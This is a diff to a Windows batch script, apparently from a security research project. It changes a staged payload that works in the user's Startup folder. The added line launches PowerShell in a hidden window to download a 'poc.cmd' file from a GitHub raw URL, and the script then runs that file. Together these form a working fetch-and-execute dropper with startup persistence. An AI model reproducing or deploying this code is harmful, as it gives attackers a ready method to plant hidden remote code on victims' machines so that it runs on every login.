@@ -11,12 +11,12 @@ cd %STARTUP%
 @REM TODO: build out stage two
 @REM Write payloads to startup
 
-(
-    echo powershell -c "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/blob/main/Original/Resources/poc.cmd'"
-) > stage2.cmd
+
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/poc.cmd' -OutFile poc.cmd"
+
 
 @REM run payload
-powershell ./stage2.cmd
+powershell ./poc.cmd
 
 @REM cd back into initial Location
 cd "%INITIALPATH%"
